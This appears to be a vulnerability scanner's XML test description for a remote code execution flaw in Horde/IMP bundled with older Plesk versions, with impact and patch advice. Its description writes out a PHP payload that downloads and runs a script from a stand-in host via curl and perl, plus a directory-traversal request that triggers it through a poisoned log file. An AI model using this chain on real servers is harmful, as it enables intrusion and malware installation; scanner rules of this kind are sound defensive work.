<?xml version="1.0" standalone="no"?>
<WebApplicationTest>
	<TestDescription name="Horde/IMP Plesk webmail exploit" version="0.1" released="20080307" updated="20140306" protocol="FTP" mayproxy="false" affects="server" severity="high" alert="success" type="Configuration">
		<WASPDescription BindAlertToFile="0" CrawlerProcessingMode="ParseOnly" TargetFormat="" Target="" ModuleName="" Request="" Response="" FullResponse="" DetailsFormat="" Details="" AuthType="0" AuthName="" AuthPass="" CompInfo="" DetaliedInformation="" AlertTags="code_execution,known_vulnerabilities" CVE="" CWE="CWE-20" CVSSVer="2.0" CVSSScore="6.8" CVSSDescr="AV:N/AC:M/Au:N/C:P/I:P/A:P/E:POC/RL:OF/RC:C" CVSSScoreTemp="5.4" CVSSScoreEnv="5.4"/>
		<Copyright></Copyright>
		<Description>The Horde/IMP package (3.1.7-3.3.2) that is shipped with Plesk v. 8.x and earlier versions of 9.x (before 9.5.4) has a vulnerability that allows an attacker to run malicious software by passing the login to the webmail with a POST request to the /horde/imp/redirect.php file that includes the PHP code as the username. For example [break]
[pre]
&lt;?php passthru("cd /tmp;curl -O -s http://domain.tld/new.txt;perl new.txt;rm -rf new.txt"); ?&gt;
[/pre]
This results in the PHP code being logged to the /var/log/psa-horde/psa-horde.log file, which, due to a vulnerability in the barcode.php file, allows attackers to cause Horde to execute the code by making this request:[break]
[pre]
/horde/util/barcode.php?type=../../../../../../../../../../../var/log/psa-horde/psa-horde.log%00
[/pre]

Plesk versions affected:[break][ul]
[li]Parallels Plesk Panel 9.3 for Linux/Unix[/li]
[li]Parallels Plesk Panel 9.2 for Linux/Unix[/li]
[li]Parallels Plesk Panel 9.0 for Linux/Unix[/li]
[li]Parallels Plesk Panel 8.6 for Linux/Unix[/li]
[li]Parallels Plesk Panel 9.3 for Windows[/li]
[li]Parallels Plesk Panel 9.2 for Windows[/li]
[li]Parallels Plesk Panel 9.0 for Windows[/li]
[li]Parallels Plesk Panel 8.6 for Windows[/li]
[ul]</Description>
		<ApplicableTo>
			<Platform>
				<OS>*</OS>
				<Arch>*</Arch>
			</Platform>
			<WebServer>*</WebServer>
			<ApplicationServer>*</ApplicationServer>
		</ApplicableTo>
		<Impact>Remote code execution.</Impact>
		<Recommendation>Download and install the appropriate patch for Horde 3.1.7-3.3.2 in accordance with the platform your server runs on.</Recommendation>
		<Reference database="Horde/IMP Plesk Webmail Exploit" URL="http://kb.parallels.com/en/113374"/></TestDescription>
</WebApplicationTest>
